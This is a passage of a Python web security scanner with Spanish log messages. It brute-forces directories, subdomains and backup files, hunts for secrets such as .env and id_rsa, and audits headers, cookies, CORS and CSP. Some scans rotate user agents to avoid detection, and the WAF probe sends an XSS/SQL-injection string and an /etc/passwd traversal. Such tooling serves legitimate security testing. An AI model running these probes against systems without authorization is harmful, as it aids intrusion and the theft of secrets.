                    findings.append(str(n) + "." + domain)
                    log_ok(f"  {n}.{domain}")
            except Exception:
                log_info(f"  AXFR denegado en {ns_host}")
    except Exception as e:
        log_fail(f"No se pudieron resolver NS: {e}")
    ctx["results"]["zone_transfer"] = findings


# =====================================================================
#  MODULE 4: DNS RECON
# =====================================================================
def mod_dns_recon(ctx):
    section_header("DNS RECON")
    domain = ctx["domain"]
    if not dns:
        log_warn("dnspython no instalado.")
        return
    records = {}
    for rtype in ["A","AAAA","MX","TXT","NS","SOA","CNAME","SRV","CAA","PTR"]:
        ctx["rate_limiter"].wait()
        try:
            answers = dns.resolver.resolve(domain, rtype)
            records[rtype] = [str(r) for r in answers]
            for r in answers:
                log_ok(f"{rtype}: {r}")
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers, Exception):
            pass

    # SPF / DMARC / DKIM checks
    for sub, label in [("_dmarc", "DMARC"), ("default._domainkey", "DKIM")]:
        ctx["rate_limiter"].wait()
        try:
            answers = dns.resolver.resolve(f"{sub}.{domain}", "TXT")
            for r in answers:
                log_ok(f"{label}: {r}")
                records[label] = str(r)
        except Exception:
            pass

    ctx["results"]["dns_records"] = records


# =====================================================================
#  MODULE 5: DIRECTORY BRUTEFORCE
# =====================================================================
def mod_dirbust(ctx):
    section_header("DIRECTORY BRUTEFORCE")
    base = ctx["base_url"]
    session = ctx["session"]
    wordlist = ctx.get("custom_wordlist") or DIR_WORDLIST
    extensions = ctx.get("extensions", "php,html,txt,bak,old,asp,aspx,jsp,json,xml,yml,yaml,conf,cfg,ini,log,sql,zip,tar.gz,rar").split(",")
    found = []

    paths = list(wordlist)
    for word in list(wordlist):
        for ext in extensions:
            paths.append(f"{word}.{ext}")
    paths = list(set(paths))
    if ctx["mode_config"]["randomize"]:
        random.shuffle(paths)

    log_info(f"Probando {len(paths)} rutas...")
    checked = 0

    def check_path(path):
        url = f"{base}/{path}"
        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and r.status_code not in (404, 502, 503):
            return (path, r.status_code, len(r.content))
        return None

    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
        futures = {executor.submit(check_path, p): p for p in paths}
        for f in as_completed(futures):
            checked += 1
            result = f.result()
            if result:
                path, code, size = result
                found.append({"path": path, "status": code, "size": size})
                if code == 200:
                    log_ok(f"/{path} [{code}] ({size} bytes)")
                elif code in (301, 302, 303, 307, 308):
                    log_ok(f"/{path} [{code}] REDIRECT")
                elif code == 403:
                    log_warn(f"/{path} [{code}] FORBIDDEN")
                elif code == 401:
                    log_warn(f"/{path} [{code}] AUTH REQUIRED")
                else:
                    log_info(f"/{path} [{code}]")

    ctx["results"]["directories"] = found
    log_info(f"Encontrados: {len(found)} rutas ({checked} probadas)")


# =====================================================================
#  MODULE 6: SUBDOMAIN BRUTEFORCE
# =====================================================================
def mod_subdomain_brute(ctx):
    section_header("SUBDOMAIN BRUTEFORCE")
    domain = ctx["domain"]
    wordlist = ctx.get("custom_sublist") or SUB_WORDLIST
    found = []

    subs = list(wordlist)
    if ctx["mode_config"]["randomize"]:
        random.shuffle(subs)

    log_info(f"Probando {len(subs)} subdominios de {domain}...")

    def check_sub(sub):
        fqdn = f"{sub}.{domain}"
        ctx["rate_limiter"].wait()
        try:
            answers = socket.getaddrinfo(fqdn, None)
            ip = answers[0][4][0]
            return (fqdn, ip)
        except socket.gaierror:
            return None

    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
        futures = {executor.submit(check_sub, s): s for s in subs}
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append({"subdomain": r[0], "ip": r[1]})
                log_ok(f"{r[0]} -> {r[1]}")

    ctx["results"]["subdomains"] = found
    log_info(f"Encontrados: {len(found)} subdominios")


# =====================================================================
#  MODULE 7: VHOST DISCOVERY
# =====================================================================
def mod_vhost(ctx):
    section_header("VHOST DISCOVERY")
    base = ctx["base_url"]
    domain = ctx["domain"]
    session = ctx["session"]

    # Get baseline response
    r = safe_request(session, "GET", base, ctx["rate_limiter"])
    if not r:
        log_fail("No se pudo obtener respuesta baseline.")
        return
    baseline_size = len(r.content)
    baseline_code = r.status_code
    found = []

    vhosts = [f"{s}.{domain}" for s in SUB_WORDLIST[:60]]
    if ctx["mode_config"]["randomize"]:
        random.shuffle(vhosts)

    for vhost in vhosts:
        r = safe_request(session, "GET", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                         headers={"Host": vhost})
        if r and (r.status_code != baseline_code or abs(len(r.content) - baseline_size) > 100):
            found.append({"vhost": vhost, "status": r.status_code, "size": len(r.content)})
            log_ok(f"VHost: {vhost} [{r.status_code}] ({len(r.content)} bytes)")

    ctx["results"]["vhosts"] = found


# =====================================================================
#  MODULE 8: WEB CRAWLER
# =====================================================================
def mod_crawler(ctx):
    section_header("WEB CRAWLER")
    base = ctx["base_url"]
    session = ctx["session"]
    max_depth = ctx.get("crawl_depth", 3)
    max_pages = ctx.get("crawl_pages", 100)

    visited = set()
    queue = deque([(ctx["target_url"], 0)])
    all_links = set()
    all_forms = []
    all_params = set()
    all_emails = set()
    all_js = set()

    while queue and len(visited) < max_pages:
        url, depth = queue.popleft()
        if url in visited or depth > max_depth:
            continue
        visited.add(url)

        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if not r or "text/html" not in r.headers.get("Content-Type", ""):
            continue

        parser = LinkParser()
        try:
            parser.feed(r.text)
        except Exception:
            continue

        all_forms.extend(parser.forms)
        all_params.update(parser.params)
        all_emails.update(parser.emails)
        all_js.update(parser.js_files)

        for link in parser.links:
            full = urljoin(url, link)
            p = urlparse(full)
            if p.hostname == ctx["domain"] and full not in visited:
                all_links.add(full)
                if depth + 1 <= max_depth:
                    queue.append((full, depth + 1))

        # Extract params from URL query strings
        for link in all_links:
            qs = urlparse(link).query
            if qs:
                for k in parse_qs(qs).keys():
                    all_params.add(k)

    ctx["results"]["crawler"] = {
        "pages": len(visited),
        "links": len(all_links),
        "forms": len(all_forms),
        "params": list(all_params),
        "emails": list(all_emails),
        "js_files": list(all_js),
    }
    log_ok(f"Crawled: {len(visited)} paginas, {len(all_links)} links, {len(all_forms)} forms")
    log_ok(f"Params: {len(all_params)}, Emails: {len(all_emails)}, JS: {len(all_js)}")
    if all_emails:
        for em in list(all_emails)[:10]:
            log_info(f"  Email: {em}")
    if all_params:
        log_info(f"  Params: {', '.join(list(all_params)[:20])}")

    ctx["_crawled_links"] = all_links
    ctx["_crawled_forms"] = all_forms
    ctx["_crawled_params"] = all_params


# =====================================================================
#  MODULE 9: PARAMETER DISCOVERY
# =====================================================================
def mod_param_discovery(ctx):
    section_header("PARAMETER DISCOVERY")
    base = ctx["target_url"]
    session = ctx["session"]

    # Baseline
    r = safe_request(session, "GET", base, ctx["rate_limiter"])
    if not r:
        log_fail("No se pudo obtener respuesta.")
        return
    baseline_size = len(r.content)
    found = []
    params = list(PARAM_WORDLIST)
    if ctx["mode_config"]["randomize"]:
        random.shuffle(params)

    for param in params:
        url = f"{base}?{param}=test123"
        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and abs(len(r.content) - baseline_size) > 50:
            found.append(param)
            log_ok(f"Parametro activo: {param}")

    ctx["results"]["params_discovered"] = found
    log_info(f"Parametros activos: {len(found)}")


# =====================================================================
#  MODULE 10: API DISCOVERY
# =====================================================================
def mod_api_discovery(ctx):
    section_header("API DISCOVERY")
    base = ctx["base_url"]
    session = ctx["session"]
    found = []

    endpoints = list(API_WORDLIST)
    if ctx["mode_config"]["randomize"]:
        random.shuffle(endpoints)

    def check_api(path):
        url = f"{base}/{path}"
        for method in ["GET"]:
            r = safe_request(session, method, url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if r and r.status_code not in (404, 502, 503):
                ct = r.headers.get("Content-Type", "")
                return {"path": path, "status": r.status_code, "content_type": ct, "size": len(r.content)}
        return None

    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
        futures = {executor.submit(check_api, p): p for p in endpoints}
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)
                log_ok(f"API: /{r['path']} [{r['status']}] {r['content_type']}")

    ctx["results"]["api_endpoints"] = found


# =====================================================================
#  MODULE 11: SENSITIVE FILES DISCOVERY
# =====================================================================
def mod_sensitive_files(ctx):
    section_header("SENSITIVE FILES DISCOVERY")
    base = ctx["base_url"]
    session = ctx["session"]
    found = []

    files = list(SENSITIVE_FILES)
    if ctx["mode_config"]["randomize"]:
        random.shuffle(files)

    log_info(f"Probando {len(files)} archivos sensibles...")

    def check_file(path):
        url = f"{base}/{path}"
        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and r.status_code == 200 and len(r.content) > 0:
            # Verificar que no sea una pagina de error generica
            body = r.text.lower()
            if "404" not in body[:200] and "not found" not in body[:200]:
                return {"path": path, "size": len(r.content), "snippet": r.text[:200]}
        return None

    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
        futures = {executor.submit(check_file, p): p for p in files}
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)
                sev = "HIGH" if any(k in r["path"] for k in [".env",".git","config","password","credential","secret","id_rsa","shadow"]) else "MEDIUM"
                log_vuln(sev, f"Archivo sensible: /{r['path']} ({r['size']} bytes)")

    ctx["results"]["sensitive_files"] = found


# =====================================================================
#  MODULE 12: BACKUP DISCOVERY
# =====================================================================
def mod_backup_discovery(ctx):
    section_header("BACKUP FILE DISCOVERY")
    base = ctx["base_url"]
    session = ctx["session"]
    domain = ctx["domain"]
    found = []

    # Generar nombres de backup basados en el dominio
    base_names = [domain, domain.replace(".", "_"), domain.split(".")[0],
                  "backup", "db", "database", "site", "web", "www", "data", "dump"]
    extensions = [".sql", ".sql.gz", ".sql.bz2", ".sql.zip", ".tar", ".tar.gz",
                  ".tgz", ".zip", ".rar", ".7z", ".bak", ".old", ".save",
                  ".dump", ".db", ".sqlite", ".mdb", ".csv"]
    paths = []
    for name in base_names:
        for ext in extensions:
            paths.append(f"{name}{ext}")
        paths.append(f"{name}_backup.sql")
        paths.append(f"{name}_dump.sql")
        paths.append(f"{name}.sql.bak")

    # Patrones comunes de fecha
    now = datetime.now()
    for name in base_names[:3]:
        for fmt in ["%Y%m%d", "%Y-%m-%d", "%Y", "%m%Y"]:
            paths.append(f"{name}_{now.strftime(fmt)}.sql")
            paths.append(f"{name}_{now.strftime(fmt)}.zip")

    if ctx["mode_config"]["randomize"]:
        random.shuffle(paths)

    log_info(f"Probando {len(paths)} posibles backups...")

    for path in paths:
        url = f"{base}/{path}"
        r = safe_request(session, "HEAD", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and r.status_code == 200:
            size = int(r.headers.get("Content-Length", 0))
            found.append({"path": path, "size": size})
            log_vuln("HIGH", f"Backup encontrado: /{path} ({size} bytes)")

    ctx["results"]["backup_files"] = found


# =====================================================================
#  MODULE 13: TECH FINGERPRINT
# =====================================================================
def mod_tech_fingerprint(ctx):
    section_header("TECH FINGERPRINT")
    url = ctx["target_url"]
    session = ctx["session"]
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if not r:
        log_fail("No se pudo conectar.")
        return

    techs = []
    headers = {k.lower(): v for k, v in r.headers.items()}
    body = r.text.lower()

    # Server
    if "server" in headers:
        techs.append(("Server", headers["server"]))
    if "x-powered-by" in headers:
        techs.append(("Powered-By", headers["x-powered-by"]))
    if "x-aspnet-version" in headers:
        techs.append(("ASP.NET", headers["x-aspnet-version"]))

    # Frameworks
    checks = [
        ("WordPress", ["wp-content", "wp-includes", "wordpress"]),
        ("Joomla", ["joomla", "/media/jui/", "com_content"]),
        ("Drupal", ["drupal", "sites/default/files", "misc/drupal.js"]),
        ("Laravel", ["laravel", "csrf-token", "laravel_session"]),
        ("Django", ["csrfmiddlewaretoken", "django", "__admin__"]),
        ("Ruby on Rails", ["rails", "csrf-token", "turbolinks"]),
        ("Express.js", ["express", "x-powered-by: express"]),
        ("Spring", ["jsessionid", "org.springframework"]),
        ("ASP.NET", ["__viewstate", "__eventvalidation", "asp.net"]),
        ("React", ["react", "_reactroot", "data-reactroot"]),
        ("Vue.js", ["vue.js", "v-cloak", "data-v-"]),
        ("Angular", ["ng-version", "ng-app", "angular"]),
        ("Next.js", ["__next", "_next/static", "nextjs"]),
        ("Nuxt.js", ["__nuxt", "_nuxt/", "nuxt"]),
        ("jQuery", ["jquery", "jquery.min.js"]),
        ("Bootstrap", ["bootstrap", "bootstrap.min"]),
        ("Tailwind", ["tailwind"]),
        ("PHP", [".php", "phpsessid", "x-powered-by: php"]),
        ("Node.js", ["node.js", "x-powered-by: express"]),
        ("Nginx", ["nginx"]),
        ("Apache", ["apache"]),
        ("IIS", ["microsoft-iis", "x-aspnet"]),
        ("Cloudflare", ["cloudflare", "cf-ray"]),
        ("AWS", ["amazons3", "x-amz-", "aws"]),
        ("Firebase", ["firebase", "firebaseapp"]),
        ("Shopify", ["shopify", "myshopify"]),
        ("Squarespace", ["squarespace"]),
        ("Wix", ["wix.com", "wixsite"]),
    ]
    header_str = str(headers).lower()
    cookie_str = str(r.cookies.get_dict()).lower()
    full_text = body + header_str + cookie_str

    for name, sigs in checks:
        if any(s in full_text for s in sigs):
            techs.append(("Framework/Tech", name))

    ctx["results"]["technologies"] = techs
    for cat, name in techs:
        log_ok(f"{cat}: {name}")


# =====================================================================
#  MODULE 14: WAF DETECTION
# =====================================================================
def mod_waf_detect(ctx):
    section_header("WAF DETECTION")
    url = ctx["target_url"]
    session = ctx["session"]

    wafs = {
        "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache"],
        "AWS WAF": ["awswaf", "x-amzn-requestid"],
        "Akamai": ["akamai", "x-akamai"],
        "Imperva/Incapsula": ["incap_ses", "visid_incap", "incapsula"],
        "Sucuri": ["sucuri", "x-sucuri"],
        "ModSecurity": ["modsecurity", "mod_security"],
        "F5 BIG-IP": ["bigip", "big-ip", "f5"],
        "Barracuda": ["barracuda", "barra_counter"],
        "Fortinet/FortiWeb": ["fortigate", "fortiweb"],
        "Citrix NetScaler": ["netscaler", "ns_af", "citrix"],
        "DDoS-Guard": ["ddos-guard"],
        "Fastly": ["fastly"],
        "StackPath": ["stackpath"],
        "Wordfence": ["wordfence"],
    }

    # Normal request
    r1 = safe_request(session, "GET", url, ctx["rate_limiter"])
    # Malicious request to trigger WAF
    r2 = safe_request(session, "GET", f"{url}?test=<script>alert(1)</script>'OR+1=1--", ctx["rate_limiter"])
    r3 = safe_request(session, "GET", f"{url}/../../etc/passwd", ctx["rate_limiter"])

    detected = []
    for resp in [r1, r2, r3]:
        if not resp:
            continue
        h_str = str(resp.headers).lower()
        body = resp.text.lower()[:5000]
        cookies = str(resp.cookies.get_dict()).lower()
        full = h_str + body + cookies
        for waf_name, sigs in wafs.items():
            if any(s in full for s in sigs) and waf_name not in detected:
                detected.append(waf_name)
                log_vuln("INFO", f"WAF detectado: {waf_name}")

    # Check status code difference
    if r1 and r2:
        if r2.status_code in (403, 406, 429, 503) and r1.status_code == 200:
            log_warn("WAF activo: requests maliciosos bloqueados")

    ctx["results"]["waf"] = detected if detected else ["None detected"]


# =====================================================================
#  MODULE 15: CMS ENUMERATION
# =====================================================================
def mod_cms_enum(ctx):
    section_header("CMS ENUMERATION")
    base = ctx["base_url"]
    session = ctx["session"]
    findings = []

    # WordPress
    wp_paths = ["wp-login.php","wp-admin/","wp-json/wp/v2/","wp-content/",
                "wp-includes/","xmlrpc.php","wp-json/wp/v2/users",
                "wp-json/wp/v2/posts","readme.html","license.txt"]
    for p in wp_paths:
        r = safe_request(session, "GET", f"{base}/{p}", ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and r.status_code == 200:
            findings.append({"cms": "WordPress", "path": p, "status": r.status_code})
            log_ok(f"WordPress: /{p}")
            # Try to get version
            if p == "readme.html" and "version" in r.text.lower():
                ver = re.search(r'Version\s*([\d.]+)', r.text, re.I)
                if ver:
                    log_ok(f"  WordPress version: {ver.group(1)}")

    # Joomla
    joomla_paths = ["administrator/","administrator/manifests/files/joomla.xml",
                    "language/en-GB/en-GB.xml","plugins/system/cache/cache.xml"]
    for p in joomla_paths:
        r = safe_request(session, "GET", f"{base}/{p}", ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and r.status_code == 200:
            findings.append({"cms": "Joomla", "path": p})
            log_ok(f"Joomla: /{p}")

    # Drupal
    drupal_paths = ["CHANGELOG.txt","core/CHANGELOG.txt","core/install.php",
                    "core/misc/drupal.js","user/login"]
    for p in drupal_paths:
        r = safe_request(session, "GET", f"{base}/{p}", ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r and r.status_code == 200:
            findings.append({"cms": "Drupal", "path": p})
            log_ok(f"Drupal: /{p}")

    ctx["results"]["cms"] = findings


# =====================================================================
#  MODULE 16: SSL/TLS AUDIT
# =====================================================================
def mod_ssl_audit(ctx):
    section_header("SSL/TLS AUDIT")
    host = ctx["target_host"]
    findings = []

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
        conn.settimeout(10)
        conn.connect((host, 443))
        cert = conn.getpeercert(True)
        cert_info = ssl.DER_cert_to_PEM_cert(cert)
        cipher = conn.cipher()
        version = conn.version()
        conn.close()

        findings.append({"type": "tls_version", "value": version})
        log_ok(f"TLS Version: {version}")
        if cipher:
            log_ok(f"Cipher: {cipher[0]} ({cipher[2]} bits)")
            findings.append({"type": "cipher", "value": cipher[0], "bits": cipher[2]})

        # Check for weak versions
        weak_protos = [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1] if hasattr(ssl, 'PROTOCOL_TLSv1') else []
        for proto_name in ["TLSv1", "TLSv1.1"]:
            try:
                ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx2.check_hostname = False
                ctx2.verify_mode = ssl.CERT_NONE
                ctx2.maximum_version = getattr(ssl.TLSVersion, proto_name.replace(".", "_"), None)
                ctx2.minimum_version = ctx2.maximum_version
                if ctx2.maximum_version:
                    s2 = ctx2.wrap_socket(socket.socket(), server_hostname=host)
                    s2.settimeout(5)
                    s2.connect((host, 443))
                    s2.close()
                    log_vuln("MEDIUM", f"Protocolo debil soportado: {proto_name}")
                    findings.append({"type": "weak_protocol", "value": proto_name})
            except Exception:
                pass

        # Certificate details
        try:
            c2 = ssl.create_default_context()
            conn2 = c2.wrap_socket(socket.socket(), server_hostname=host)
            conn2.settimeout(10)
            conn2.connect((host, 443))
            cert_dict = conn2.getpeercert()
            conn2.close()
            if cert_dict:
                not_after = cert_dict.get("notAfter", "")
                subject = dict(x[0] for x in cert_dict.get("subject", ()))
                issuer = dict(x[0] for x in cert_dict.get("issuer", ()))
                log_ok(f"Subject: {subject.get('commonName', 'N/A')}")
                log_ok(f"Issuer: {issuer.get('organizationName', 'N/A')}")
                log_ok(f"Expires: {not_after}")
                sans = [v for t, v in cert_dict.get("subjectAltName", ()) if t == "DNS"]
                if sans:
                    log_ok(f"SANs: {', '.join(sans[:10])}")
                    findings.append({"type": "sans", "value": sans})
        except ssl.SSLCertVerificationError as e:
            log_vuln("MEDIUM", f"Certificado invalido: {e}")
            findings.append({"type": "cert_error", "value": str(e)})
        except Exception:
            pass

    except Exception as e:
        log_fail(f"No se pudo conectar SSL: {e}")

    ctx["results"]["ssl"] = findings


# =====================================================================
#  MODULE 17: HTTP METHODS TESTING
# =====================================================================
def mod_http_methods(ctx):
    section_header("HTTP METHODS TESTING")
    url = ctx["target_url"]
    session = ctx["session"]
    methods = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE","CONNECT",
               "PROPFIND","PROPPATCH","MKCOL","COPY","MOVE","LOCK","UNLOCK"]
    allowed = []
    dangerous = []

    for method in methods:
        ctx["rate_limiter"].wait()
        r = safe_request(session, method, url, rotate_ua=ctx["mode_config"]["rotate_ua"])
        if r and r.status_code not in (405, 501, 400):
            allowed.append({"method": method, "status": r.status_code})
            if method in ("TRACE","PUT","DELETE","CONNECT","MOVE","COPY"):
                log_vuln("MEDIUM", f"Metodo peligroso habilitado: {method} [{r.status_code}]")
                dangerous.append(method)
            else:
                log_ok(f"{method} [{r.status_code}]")

    # Check OPTIONS header
    r = safe_request(session, "OPTIONS", url, ctx["rate_limiter"])
    if r and "Allow" in r.headers:
        log_info(f"Allow header: {r.headers['Allow']}")

    ctx["results"]["http_methods"] = {"allowed": allowed, "dangerous": dangerous}


# =====================================================================
#  MODULE 18: SECURITY HEADERS AUDIT
# =====================================================================
def mod_security_headers(ctx):
    section_header("SECURITY HEADERS AUDIT")
    url = ctx["target_url"]
    session = ctx["session"]
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if not r:
        log_fail("No response.")
        return

    headers = {k.lower(): v for k, v in r.headers.items()}
    findings = []

    checks = [
        ("strict-transport-security", "HSTS", "HIGH",
         "Falta Strict-Transport-Security - vulnerable a downgrade attacks"),
        ("x-content-type-options", "X-Content-Type-Options", "LOW",
         "Falta X-Content-Type-Options - MIME sniffing posible"),
        ("x-frame-options", "X-Frame-Options", "MEDIUM",
         "Falta X-Frame-Options - vulnerable a clickjacking"),
        ("x-xss-protection", "X-XSS-Protection", "LOW",
         "Falta X-XSS-Protection header"),
        ("content-security-policy", "CSP", "MEDIUM",
         "Falta Content-Security-Policy - XSS risk"),
        ("referrer-policy", "Referrer-Policy", "LOW",
         "Falta Referrer-Policy - information leakage"),
        ("permissions-policy", "Permissions-Policy", "LOW",
         "Falta Permissions-Policy"),
        ("x-permitted-cross-domain-policies", "X-Permitted-Cross-Domain-Policies", "LOW",
         "Falta X-Permitted-Cross-Domain-Policies"),
        ("cross-origin-opener-policy", "COOP", "LOW",
         "Falta Cross-Origin-Opener-Policy"),
        ("cross-origin-resource-policy", "CORP", "LOW",
         "Falta Cross-Origin-Resource-Policy"),
        ("cross-origin-embedder-policy", "COEP", "LOW",
         "Falta Cross-Origin-Embedder-Policy"),
    ]

    for header, name, severity, msg in checks:
        if header in headers:
            log_ok(f"{name}: {headers[header]}")
            findings.append({"header": name, "present": True, "value": headers[header]})
            # Check weak values
            if header == "strict-transport-security":
                if "max-age=0" in headers[header]:
                    log_vuln("HIGH", "HSTS max-age=0 (deshabilitado)")
            if header == "content-security-policy":
                csp = headers[header].lower()
                if "unsafe-inline" in csp:
                    log_vuln("MEDIUM", "CSP permite unsafe-inline")
                if "unsafe-eval" in csp:
                    log_vuln("MEDIUM", "CSP permite unsafe-eval")
                if "*" in csp.split():
                    log_vuln("MEDIUM", "CSP usa wildcard *")
        else:
            log_vuln(severity, msg)
            findings.append({"header": name, "present": False, "severity": severity})

    # Info disclosure headers
    info_headers = ["server", "x-powered-by", "x-aspnet-version", "x-runtime",
                    "x-generator", "x-drupal-cache", "x-debug"]
    for h in info_headers:
        if h in headers:
            log_vuln("LOW", f"Info disclosure: {h}: {headers[h]}")
            findings.append({"header": h, "present": True, "value": headers[h], "type": "info_disclosure"})

    ctx["results"]["security_headers"] = findings


# =====================================================================
#  MODULE 19: COOKIE SECURITY
# =====================================================================
def mod_cookie_security(ctx):
    section_header("COOKIE SECURITY ANALYSIS")
    url = ctx["target_url"]
    session = ctx["session"]
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if not r:
        log_fail("No response.")
        return

    findings = []
    set_cookie_headers = r.headers.get("Set-Cookie", "")
    if not set_cookie_headers and not r.cookies:
        log_info("No se encontraron cookies.")
        return

    # Parse Set-Cookie headers
    raw_cookies = r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw.headers, "getlist") else [set_cookie_headers]

    for cookie_str in raw_cookies:
        if not cookie_str:
            continue
        parts = cookie_str.split(";")
        name = parts[0].split("=")[0].strip() if "=" in parts[0] else parts[0].strip()
        flags_str = cookie_str.lower()
        issues = []

        if "secure" not in flags_str:
            issues.append("Falta flag Secure")
        if "httponly" not in flags_str:
            issues.append("Falta flag HttpOnly")
        if "samesite" not in flags_str:
            issues.append("Falta flag SameSite")
        elif "samesite=none" in flags_str:
            issues.append("SameSite=None (cross-site)")

        finding = {"name": name, "flags": flags_str, "issues": issues}
        findings.append(finding)

        if issues:
            for issue in issues:
                sev = "MEDIUM" if "Secure" in issue or "HttpOnly" in issue else "LOW"
                log_vuln(sev, f"Cookie '{name}': {issue}")
        else:
            log_ok(f"Cookie '{name}': Bien configurada")

    ctx["results"]["cookies"] = findings


# =====================================================================
#  MODULE 20: CORS TESTING
# =====================================================================
def mod_cors_test(ctx):
    section_header("CORS TESTING")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    origins = [
        "https://evil.com",
        "https://attacker.com",
        f"https://{ctx['domain']}.evil.com",
        f"https://evil{ctx['domain']}",
        "null",
        f"https://{ctx['domain']}",
        "https://localhost",
        "http://localhost",
    ]

    for origin in origins:
        ctx["rate_limiter"].wait()
        r = safe_request(session, "GET", url, headers={"Origin": origin},
                         rotate_ua=ctx["mode_config"]["rotate_ua"])
        if not r:
            continue
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")

        if acao:
            finding = {"origin": origin, "acao": acao, "acac": acac}
            if acao == "*":
                log_vuln("MEDIUM", f"CORS: wildcard * (Origin: {origin})")
                finding["severity"] = "MEDIUM"
            elif acao == origin and origin not in (f"https://{ctx['domain']}", ""):
                log_vuln("HIGH", f"CORS refleja origin arbitrario: {origin}")
                finding["severity"] = "HIGH"
                if acac.lower() == "true":
                    log_vuln("CRITICAL", f"CORS: origin reflejado + credentials! (Origin: {origin})")
                    finding["severity"] = "CRITICAL"
            elif acao == "null":
                log_vuln("HIGH", "CORS: acepta origin null")
                finding["severity"] = "HIGH"
            findings.append(finding)

    ctx["results"]["cors"] = findings


# =====================================================================
#  MODULE 21: CSP ANALYSIS
# =====================================================================
def mod_csp_analysis(ctx):
    section_header("CSP ANALYSIS")
    url = ctx["target_url"]
    session = ctx["session"]
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if not r:
        return

    csp = r.headers.get("Content-Security-Policy", "")
    csp_ro = r.headers.get("Content-Security-Policy-Report-Only", "")
    findings = []

    if not csp and not csp_ro:
        log_vuln("MEDIUM", "No se encontro Content-Security-Policy")
        ctx["results"]["csp"] = [{"issue": "No CSP header"}]
        return

    policy = csp or csp_ro
    if csp_ro and not csp:
        log_warn("Solo existe CSP en modo Report-Only (no enforcing)")
        findings.append({"issue": "Report-Only mode"})

    directives = {}
    for part in policy.split(";"):
        part = part.strip()
        if part:
            tokens = part.split()
            if tokens:
                directives[tokens[0]] = tokens[1:] if len(tokens) > 1 else []

    log_info(f"Directivas encontradas: {len(directives)}")

    # Check for dangerous values
    dangerous = {
        "unsafe-inline": "Permite inline scripts/styles - XSS posible",
        "unsafe-eval": "Permite eval() - code injection posible",
        "data:": "Permite data: URIs - bypass CSP",
        "blob:": "Permite blob: URIs - bypass posible",
        "*": "Wildcard - permite cualquier source",
    }
    for directive, values in directives.items():
        for val in values:
            if val.strip("'") in dangerous or val in dangerous:
                msg = dangerous.get(val.strip("'"), dangerous.get(val, ""))
                log_vuln("MEDIUM", f"CSP {directive}: {val} - {msg}")
                findings.append({"directive": directive, "value": val, "issue": msg})

    # Missing important directives
    important = ["default-src", "script-src", "style-src", "img-src", "frame-ancestors", "base-uri", "form-action"]
    for d in important:
        if d not in directives:
            log_warn(f"Falta directiva: {d}")
            findings.append({"directive": d, "issue": "missing"})

    ctx["results"]["csp"] = findings


# =====================================================================
#  MODULE 22: CLICKJACKING TEST
# =====================================================================
def mod_clickjacking(ctx):
    section_header("CLICKJACKING TEST")
    url = ctx["target_url"]
    session = ctx["session"]
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if not r:
        return

    xfo = r.headers.get("X-Frame-Options", "")
    csp = r.headers.get("Content-Security-Policy", "")
    findings = []

    if xfo:
        log_ok(f"X-Frame-Options: {xfo}")
        if xfo.upper() not in ("DENY", "SAMEORIGIN"):
            log_vuln("MEDIUM", f"X-Frame-Options valor debil: {xfo}")
            findings.append({"issue": f"Weak XFO: {xfo}"})
    else:
        log_vuln("MEDIUM", "Falta X-Frame-Options")
        findings.append({"issue": "Missing X-Frame-Options"})

    if "frame-ancestors" in csp:
        log_ok("CSP frame-ancestors presente")
    elif not xfo:
        log_vuln("MEDIUM", "Sin proteccion contra clickjacking (ni XFO ni frame-ancestors)")
        findings.append({"issue": "No clickjacking protection"})

    ctx["results"]["clickjacking"] = findings


# =====================================================================
#  MODULE 23: CSRF DETECTION
# =====================================================================
def mod_csrf_detection(ctx):
    section_header("CSRF DETECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    forms = ctx.get("_crawled_forms", [])
    findings = []

    if not forms:
        # Try to find forms on main page
        r = safe_request(session, "GET", url, ctx["rate_limiter"])
        if r:
            parser = LinkParser()
            try:
                parser.feed(r.text)
            except Exception:
                pass
            forms = parser.forms

    if not forms:
        log_info("No se encontraron formularios para analizar.")
        return

    csrf_tokens = ["csrf", "token", "_token", "csrf_token", "csrfmiddlewaretoken",
                   "authenticity_token", "__requestverificationtoken", "antiforgery",
                   "xsrf", "_csrf", "nonce"]

    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        if method != "POST":
            continue

        has_csrf = False
        for inp in inputs:
            if any(t in inp.lower() for t in csrf_tokens):
                has_csrf = True
                break

        if not has_csrf:
